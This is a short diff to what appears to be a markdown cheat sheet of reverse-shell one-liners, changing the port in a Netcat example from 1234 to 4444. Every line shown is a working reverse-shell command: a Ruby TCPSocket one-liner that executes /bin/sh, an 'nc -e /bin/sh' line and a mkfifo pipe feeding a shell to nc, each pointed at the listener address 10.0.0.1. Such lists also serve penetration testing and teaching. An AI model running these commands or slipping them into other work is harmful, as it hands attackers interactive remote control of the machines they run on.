@@ -25,7 +25,7 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i
 
 ### Netcat
 ```bash
-nc -e /bin/sh 10.0.0.1 1234
+nc -e /bin/sh 10.0.0.1 4444
 ```
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
